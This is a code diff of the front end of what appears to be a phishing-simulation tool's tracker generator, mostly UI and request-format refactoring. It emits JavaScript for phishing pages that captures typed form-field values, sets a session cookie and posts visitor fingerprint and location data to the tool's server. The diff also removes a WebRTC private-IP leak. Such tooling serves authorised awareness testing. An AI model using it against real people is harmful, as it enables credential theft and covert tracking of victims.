@@ -1,7 +1,6 @@
-var form_fields_and_values = {};
+var form_fields_and_values = tracker_step_data = {};
 var dt;
-var g_tracker_id  = "", globalModalValue = '';;
-var tracker_step_data = {};
+var g_tracker_id = globalModalValue = '';
 var webpage_data = [];
 var all_form_fields = `<div class="row mb-3 HTML_form_field">
                           <div class="col-md-3">
@@ -15,40 +14,37 @@ var all_form_fields = `<div class="row mb-3 HTML_form_field">
                                   <option value="FSB">Form Submit Button (Required)</option>
                               </select>
                           </div>
-                          <div class="col-lg-3">
+                          <div class="col-md-3">
                               <input type="text" name="field_id_names" class="form-control" placeholder="NA">
                           </div>
-                          <div>
-                              <div class="custom-control custom-checkbox mr-sm-2 m-t-5">
-                                  <label>
-                                      <input type="checkbox" name="cb_field_track" class="custom-control-input" checked>
-                                      <div class="custom-control-label" data-toggle="tooltip" title="Track field" data-placement="right"></div>
+                          
+                          <div class="row">
+                              <div class="custom-control custom-switch col-sm-5 m-t-5 text-right">
+                                  <label class="switch">
+                                      <input type="checkbox" name="cb_field_track" checked>
+                                      <span class="slider round" data-toggle="tooltip" title="Track field" data-placement="top"></span>
                                   </label>
                               </div>
                           </div>
-                          <div class="col-lg-1">                            
+                          <div class="col-md-1">                            
                               <button type="button" class="btn btn-info btn-sm remove_field" data-toggle="tooltip" title="Remove field">-</button>
                           </div>
                       </div>`;
 var webpages = `<div class="new_webpage sort-blur m-t-5">
                                <div class="form-group row">
                                   <label for="field_page_name" class="col-md-2 text-left control-label col-form-label">Page name:</label>
-                                  <div class="col-md-4">
+                                  <div class="col-md-5">
                                      <input type="text" class="form-control" name="field_page_name" placeholder="eg: login page">
                                   </div>
-                                  <div class="col-md-2">                                     
-                                  </div>
-                                  <div class="col-md-2">
-                                     <button class="btn btn-info btn-sm bt_import_html_fields" data-toggle="tooltip" title="Import HTML fields"><i class="fas fa-fill-drip"></i></button>
-                                  </div>
-                                  <div class="col-md-2 text-right">
-                                     <span class="badge badge-secondary">Page:<span class="webpage_count">1</span></span><i class="m-l-5 fas fa-arrows-alt cursor-pointer icon_move" data-toggle="tooltip" title="Page order"></i>
+                                  <div class="col-md-5 text-right">
+                                      <button class="btn btn-info btn-sm bt_import_html_fields" data-toggle="tooltip" title="Import HTML fields"><i class="fas fa-fill-drip"></i></button>
+                                      <span class="badge badge-secondary">Page:<span class="webpage_count">1</span></span><i class="m-l-5 fas fa-arrows-alt cursor-pointer icon_move" data-toggle="tooltip" title="Page order"></i>
                                   </div>
                                </div>
                                <div class="form-group row">
-                                  <label for="field_page_name" class="col-md-2 text-left control-label col-form-label">Page URL:</label>
-                                  <div class="col-md-4">
-                                     <input type="text" class="form-control" name="field_page_url" placeholder="eg: https://myphishingsite.com/login">
+                                  <label for="field_page_url" class="col-md-2 text-left control-label col-form-label">Page URL:</label>
+                                  <div class="col-md-5">
+                                     <input type="text" class="form-control" name="field_page_url" placeholder="eg: https://myphishingsite.com/login or #">
                                   </div>
                                </div>
                                <div class="row">
@@ -58,19 +54,16 @@ var webpages = `<div class="new_webpage sort-blur m-t-5">
                                      `</span>
                                      <div class="row">
                                         <div class="col-md-8">
-                                           <button class="btn btn-info btn-sm bt_add_field_set">Add Field</button>
+                                           <button class="btn btn-info btn-sm bt_add_field_set mdi mdi-plus-outline">New Field</button>
                                         </div>
-                                        <div class="col-md-2">
-                                           <div class="custom-control custom-checkbox">
-                                              <label>
-                                                 <input type="checkbox" class="custom-control-input" name="cb_link_next_page" checked>
-                                                 <div class="custom-control-label">Link next page</div>
-                                              </label>
-                                           </div>
-                                        </div>
-                                        <div class="col-md-2 text-right">
-                                           <button class="btn btn-info btn-sm bt_add_next_page" data-toggle="tooltip" title="Add page"><i class="fas fa-level-down-alt"></i></button>
+                                        <div class="col-md-4 text-right">                                          
+                                            <label class="switch">
+                                              <input type="checkbox" name="cb_link_next_page" checked>
+                                              <span class="slider round" data-toggle="tooltip" title="Link to next page" data-placement="top"></span>
+                                            </label>
+                                           <button class="btn btn-info btn-sm bt_add_next_page" data-toggle="tooltip" title="Add new page"><i class="fas fa-level-down-alt"></i></button>
                                            <button class="btn btn-danger btn-sm bt_delete_page" data-toggle="tooltip" title="Delete page"><i class="fas fa-trash"></i></button>
+                                          </div>
                                         </div>
                                      </div>
                                   </div>
@@ -108,6 +101,8 @@ function startHTMLFieldFetch(){
     $("#tb_import_url").removeClass("is-invalid");
     $("#ta_HTML_content").removeClass("is-invalid");
     $("#lb_progress").removeClass("invalid-feedback");
+    $("#progressbar_status").width(0 + "%");
+    $("#lb_progress").text('');
 
     if($("#tb_import_url").val() == '' && $("#ta_HTML_content").val() == ''){
         $("#tb_import_url").addClass("is-invalid");
@@ -119,37 +114,42 @@ function startHTMLFieldFetch(){
     $("#lb_progress").show();
     $("#lb_progress").text("Fetching...");
     $("#progressbar_status").width(30 + "%");
+    var url = $("#tb_import_url").val();
 
     if($("#tb_import_url").val() != ''){
-        $.post("web_tracker_generator_list_manager", {
-                action_type: "get_html_content",
-                url: $("#tb_import_url").val()
-            },
-            function(data, status) {
-                if (data != "error")
-                    processHTMLFieldFetch(data);
-                else {
-                    $("#lb_progress").text("Error getting page content! Check the URL.");
-                    $("#lb_progress").addClass("invalid-feedback");
-                    $("#progressbar_status").width(100 + "%");
-                }
-            });
+      $.post({
+          url: "web_tracker_generator_list_manager",
+          contentType: 'application/json; charset=utf-8',
+          data: JSON.stringify({ 
+              action_type: "get_html_content",
+              url: url
+           }),
+      }).done(function (data) {
+          if(!data.error){ 
+              processHTMLFieldFetch(url,data);
+          }
+          else{
+              $("#lb_progress").text("Error getting page content! Check the URL.");
+              $("#lb_progress").addClass("invalid-feedback");
+              $("#progressbar_status").width(100 + "%");
+          }
+      }); 
     }
     else
-        processHTMLFieldFetch($("#ta_HTML_content").val());
-
+        processHTMLFieldFetch(url,$("#ta_HTML_content").val());
 }
 
-function processHTMLFieldFetch(html_content){
-    var form_elements = $(html_content).find('input,textarea');
-
+function processHTMLFieldFetch(url,html_content){
+    var form_elements = $(html_content).find('input,textarea,select');
+    
     if(form_elements.length>0){
+        globalModalValue.closest(".new_webpage").find("[name='field_page_url']").val(url);
         var ff_area = globalModalValue.closest(".new_webpage").find(".form_fields_area");
         ff_area.empty();
 
         $(form_elements).each(function(){
             ff_area.append(all_form_fields);
-            var node = $(this).prop("tagName")=="TEXTAREA"?"textarea":$(this).attr("type");
+            var node = $(this).prop("tagName")=="INPUT"?$(this).attr("type"):$(this).prop("tagName").toLowerCase();
 
             switch(node){
                 case "checkbox" :   ff_area.find('select[name="field_type_names"]:last').val("CB").change();
@@ -186,7 +186,7 @@ function processHTMLFieldFetch(html_content){
     updateFieldChanges();        
 }
 
-$(document).ready(function() { 
+$(function() {
     $('#webpages_area').append(webpages);   
     updateFieldChanges();
     $( "#webpages_area" ).sortable({
@@ -396,7 +396,6 @@ function generateTrackerCode() {
     code_output['html_form'] = "";
     code_output['js'] = "";
     code_output['php'] = "";
-    $('#tracker_code_area').empty();
     $('#html_area').empty();
     $('#js_area').empty();
     $('#others_area').empty();
@@ -404,23 +403,7 @@ function generateTrackerCode() {
     if(g_tracker_id == "")
         getNextTrackerId();
 
-    //----------Tracker code-------
-    $('#tracker_code_area').append(`<div class="row">
-                         <div class="col-md-12">
-                            <div class="alert alert-success bottom-space-dec" role="alert">
-                               Add the following tracker code to all pages of phishing website
-                            </div>
-                            <div class="col-md-12 prism_side-top">
-                                <span>
-                                    <button type="button" class="btn waves-effect waves-light btn-xs btn-dark mdi mdi-download" data-toggle="tooltip" title="Download" onClick="downloadCode('html_tracker_code')"/>
-                                    <button type="button" class="btn waves-effect waves-light btn-xs btn-dark mdi mdi-content-copy btn_copy" data-toggle="tooltip" title="Copy" onclick="copyCode('html_tracker_code')"/>
-                                </span>
-                            </div>
-                            <pre><code class="language-html html_tracker_code"></code></pre>
-                        </div>
-                    </div>`);
-    var tracker_link = `<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-                        <script src="` + location.origin + `/mod?tlink=` + g_tracker_id + `"></script>`
+    var tracker_link = `<script src="` + location.origin + `/mod?tlink=` + g_tracker_id + `"></script>`
     $('.html_tracker_code').text(html_beautify(tracker_link));
 
     //----------HTML-----
@@ -457,123 +440,111 @@ function generateTrackerCode() {
     });
 
     //-----------JS--------
-    if ($("#cb_private_ip").is(':checked'))
-        req_par += "private_ip : private_ip,";
+    if ($("#cb_screen_res").is(':checked'))
+        req_par += `screen_res : screen.width + "x" + screen.height,`;
 
-    code_output['js'] += `var private_ip = "";
-    var sess_id ="";
+    code_output['js'] += `var sess_id ="";
     var comp_name = "";
     var comp_username = "";
     var tracker_id = "` + g_tracker_id + `";
     var form_field_data;
+    var xhr = new XMLHttpRequest();
 
     //geting cid
-    var url = new URL(window.location.href);
-    var cid = url.searchParams.get("cid");
+    var cid = window.location.search.split("cid=")[1].split("&")[0];
 
     //creating session cookie
     if (document.cookie.indexOf("tsess_id=") >= 0) { // cookie exists
-        sess_id = $.map(document.cookie.split(';'), function(val) {if(val.split('=')[0].trim() == 'tsess_id') return val.split('=')[1]})[0].trim();
+      cookie_arr = document.cookie.split(';');
+      cookie_arr.forEach(function(cookie) {
+        if (cookie.split('=')[0].trim() == 'tsess_id') 
+          sess_id = cookie.split('=')[1];
+      });
     } else {
         sess_id = Math.random().toString(36).substring(8);
         document.cookie = "tsess_id=" + sess_id + ";SameSite=Lax";
     }
-        
-    window.RTCPeerConnection = window.RTCPeerConnection ||
-                             window.mozRTCPeerConnection ||
-                             window.webkitRTCPeerConnection;  
-
-    function pvtIP (cb) {
-        var pc = new RTCPeerConnection ({iceServers: []}),
-        noop = () => {};
-        
-        pc.onicecandidate = ice => 
-        cb = cb ((ice = ice && ice.candidate && ice.candidate.candidate)
-                ? ice.split(' ')[4]
-                : 'unavailable') || noop;
-        pc.createDataChannel ("");  
-        pc.createOffer (pc.setLocalDescription.bind (pc), noop);
-    };
-    `;
-
-    code_output['js'] += `pvtIP(addr => {  
-        private_ip = addr;
-        `;
-
-        if(webpage_data.count != 0) 
-          code_output['js'] +=`if(window.location.href.split('?')[0].toLowerCase() == "` + webpage_data.data[0].page_url.toLowerCase() + `") //if starting page
-        `;
-       
-        code_output['js'] += `do_track_req_visit();
-    });
-    `;
-
+    
+    var curr_page = (window.location.host+window.location.pathname).toLowerCase();
+    var first_page = "` + (new URL(webpage_data.data[0].page_url).host+new URL(webpage_data.data[0].page_url).pathname).toLowerCase() + `";
+    if(curr_page == first_page) //if starting page
+        do_track_req_visit();`;
+      
     code_output['js'] += `function do_track_req_visit() {
-                        $.post("` + location.origin + `/track", {
-                            page : 0,
-                            trackerId : tracker_id,
-                            sess_id : sess_id,` + req_par + `
+                          xhr.open("POST", "` + location.origin + `/track", true);
+                          xhr.send(JSON.stringify({
+                            page: 0,
+                            trackerId: tracker_id,
+                            sess_id : sess_id,` + 
+                            req_par + `
                             cid : cid
-                        },
-                        function(data, status) {});
-                        }\r\n//-----------------------------------------------------------
-                        $(function() {`;
+                          }));
+                        }\r\n//-----------------------------------------------------------\r\n
+                        if( document.readyState !== 'loading' )
+                          onReady();
+                        else {
+                            document.addEventListener('DOMContentLoaded', function () {
+                                onReady();
+                            });
+                        }
+
+                        function onReady(){`;
 
     $.each(webpage_data.data, function(i, obj) {
         var code_output_sub = "";
         
         $.each(webpage_data.data[i].form_fields_and_values, function(key, form_field) {
             if(!form_field.track){  
-                code_output_sub += `form_field_data["` + form_field.idname + `"]="NT";`;
+                code_output_sub += `form_field_data.` + form_field.idname + `="NT";`;
             }
-            else{
-                
-
+            else{               
                 value = form_field.idname;
 
                 if (key.startsWith("TF_") || key.startsWith("TA_") || key.startsWith("Select_"))
-                  code_output_sub += `form_field_data["` + form_field.idname + `"]=$('#` + form_field.idname + `').val();`;
+                  code_output_sub += `form_field_data.` + form_field.idname + ` =document.getElementById('` + form_field.idname + `').value;`;
                 if (key.startsWith("CB_")) {
-                  code_output_sub += `if ($("#` + form_field.idname + `").is(':checked'))
-                                          form_field_data["` + form_field.idname + `"] = true;
+                  code_output_sub += `if (document.getElementById("` + form_field.idname + `").checked) //CheckBox
+                                          form_field_data.` + form_field.idname + ` = true;
                                       else
-                                          form_field_data["` + form_field.idname + `"] = false;`;
+                                          form_field_data.` + form_field.idname + ` = false;`;
                   
                 }
-
                 if (key.startsWith("RB_")) {
-                  code_output_sub += `if($("input:radio[name='` + form_field.idname + `']").is(":checked")) //RadioButton
-                                          form_field_data["` + form_field.idname + `"] = $("input[name='` + form_field.idname + `']:checked").val();
+                  code_output_sub += `if(document.querySelector('input[name="` + form_field.idname + `"]:checked')) //RadioButton
+                                          form_field_data.` + form_field.idname + ` = document.querySelector('input[name="` + form_field.idname + `"]:checked').value;
                                       else
-                                          form_field_data["` + form_field.idname + `"] = "";`;
+                                          form_field_data.` + form_field.idname + ` = "";`;
                 }
             }
         });
 
 
-        code_output['js'] += `$("#` + webpage_data.data[i].form_fields_and_values.FSB.idname + `").click(function(e) { 
+        code_output['js'] += `if(document.getElementById("` + webpage_data.data[i].form_fields_and_values.FSB.idname + `"))
+                              document.getElementById("` + webpage_data.data[i].form_fields_and_values.FSB.idname + `").onclick = function(e) {
                                   form_field_data = {};`                            
                                   + code_output_sub +
-                                  `do_track_req(e,` + (i+1) + `,"` + webpage_data.data[i].next_page_url + `");
-                              });
+                                  `do_track_req(e,` + (i+1) + `,"` + (webpage_data.data[i].link_next_page==true?webpage_data.data[i].next_page_url:"#") + `");
+                              }
                               `;  
                         
     });
 
-    code_output['js'] += `});
+    code_output['js'] += `};
                     //-----------------------------------------------------------
                     function do_track_req(e,page,next_page_url){
-                      e.preventDefault();      
-                      $.post("` + location.origin + `/track", {
+                      e.preventDefault();  
+                      xhr.open("POST", "` + location.origin + `/track", false);
+                      xhr.send(JSON.stringify({
                         page : page,
                         trackerId : tracker_id,
-                        sess_id : sess_id,
-                        form_field_data : JSON.stringify(form_field_data),` + req_par + `
+                        sess_id : sess_id,` + 
+                        req_par + `
+                        form_field_data : form_field_data,
                         cid : cid
-                      },
-                      function(data, status) {
-                          window.top.location.href = next_page_url + "?cid=" + cid;
-                      });
+                      }));    
+
+                      if(next_page_url !="#")
+                        window.top.location.href = next_page_url + "?cid=" + cid;
                   }`;  
 
     $('#js_area').append(`<div class="row">
@@ -616,9 +587,9 @@ function copyCode(copy_code_class){
 }
 //-------End ClipboarJS -----
 
-function downloadCode(code_area, file_name) {
+function downloadCode(code_area, file_name, content_type='text/html') {
     var a = window.document.createElement('a');
-    a.href = window.URL.createObjectURL(new Blob([$('.' + code_area).text()], { type: 'text/html'}));
+    a.href = window.URL.createObjectURL(new Blob([$('.' + code_area).text()], { type: content_type}));
 
     if(code_area.startsWith("html"))
         a.download = file_name.split("/").pop();
@@ -671,12 +642,18 @@ function saveWebTracker(tracker_id) {
 
     //------------------------------------------
 
-    tracker_step_data['trackers']['cb_visit_time'] = $("#cb_visit_time").is(':checked');
     tracker_step_data['trackers']['cb_public_ip'] = $("#cb_public_ip").is(':checked');
-    tracker_step_data['trackers']['cb_private_ip'] = $("#cb_private_ip").is(':checked');
     tracker_step_data['trackers']['cb_browser'] = $("#cb_browser").is(':checked');
     tracker_step_data['trackers']['cb_os'] = $("#cb_os").is(':checked');
+    tracker_step_data['trackers']['cb_device_type'] = $("#cb_device_type").is(':checked');
     tracker_step_data['trackers']['cb_ua'] = $("#cb_ua").is(':checked');
+    tracker_step_data['trackers']['cb_screen_res'] = $("#cb_screen_res").is(':checked');
+    tracker_step_data['trackers']['cb_country'] = $("#cb_country").is(':checked');
+    tracker_step_data['trackers']['cb_city'] = $("#cb_city").is(':checked');
+    tracker_step_data['trackers']['cb_zip_code'] = $("#cb_zip_code").is(':checked');
+    tracker_step_data['trackers']['cb_isp'] = $("#cb_isp").is(':checked');
+    tracker_step_data['trackers']['cb_time_zone'] = $("#cb_time_zone").is(':checked');
+    tracker_step_data['trackers']['cb_coordinate'] = $("#cb_coordinate").is(':checked');
 
     //---------Web Pages-------------
     tracker_step_data['web_forms'] = webpage_data;
@@ -688,30 +665,37 @@ function saveWebTracker(tracker_id) {
     tracker_code_output['js_tracker'] = $('.js_code_class').text();
 
     enableDisableMe($('#genreator-form').find('a[href="#finish"]'));
-    $.post("web_tracker_generator_list_manager", {
+    $.post({
+        url: "web_tracker_generator_list_manager",
+        contentType: 'application/json; charset=utf-8',
+        data: JSON.stringify({ 
             action_type: "save_web_tracker",
             tracker_id: tracker_id,
             tracker_step_data: btoa(JSON.stringify(tracker_step_data)),
             tracker_code_output: btoa(JSON.stringify(tracker_code_output)),
-        },
-        function(data, status) {
-            if (data == "success") {
-                toastr.success('', 'Saved successfully!');
-            } else {
-                toastr.error('', 'Error saving data!');
-            }
-            enableDisableMe($('#genreator-form').find('a[href="#finish"]'));
-            window.history.replaceState(null,null, location.pathname + '?tracker=' + tracker_id);
-        });
+         }),
+    }).done(function (response) {
+        if(response.result == "success")
+            toastr.success('', 'Saved successfully!');
+        else
+            toastr.error('', response.error);
+
+        enableDisableMe($('#genreator-form').find('a[href="#finish"]'));
+        window.history.replaceState(null,null, location.pathname + '?tracker=' + tracker_id);
+    }); 
 }
 
 function editWebTracker(tracker_id) {
     g_tracker_id = tracker_id;
-    $.post("web_tracker_generator_list_manager", {
+    $.post({
+        url: "web_tracker_generator_list_manager",
+        contentType: 'application/json; charset=utf-8',
+        data: JSON.stringify({ 
             action_type: "get_web_tracker_from_id",
             tracker_id: tracker_id
-        },
-        function(data, status) {
+         }),
+    }).done(function (data) {
+        $(function() {
             $('#tracker_name').text(data['tracker_name']);
             $('#tb_tracker_name').val(data['tracker_name']);
             var tracker_step_data = JSON.parse(data['tracker_step_data']);
@@ -748,20 +732,15 @@ function editWebTracker(tracker_id) {
                         nth_web_form.find('input[name="field_id_names"]:last').val(field_value.idname);
                     }
                 });
-                
             });
-
-            if(tracker_step_data.web_forms.count>0)
-              $('#phising_site_final_page_url').val(tracker_step_data.web_forms.data[tracker_step_data.web_forms.data.length-1].next_page_url); //from last object
-            updateFieldChanges();
-            $('[data-toggle="tooltip"]').tooltip({ trigger: "hover" });
-        }).fail(function() {
+            $("#phising_site_final_page_url").val(tracker_step_data.web_forms.data[tracker_step_data.web_forms.data.length-1].next_page_url);
+        });
+    }).fail(function() {
         toastr.error('', 'Error getting tracker data!');
     });
 }
 
-function formatHTML(str) {
-    
+function formatHTML(str) {    
     var div = document.createElement('div');
     div.innerHTML = str.trim();
     var html_cont= formatHTML_child(div, 0).innerHTML;
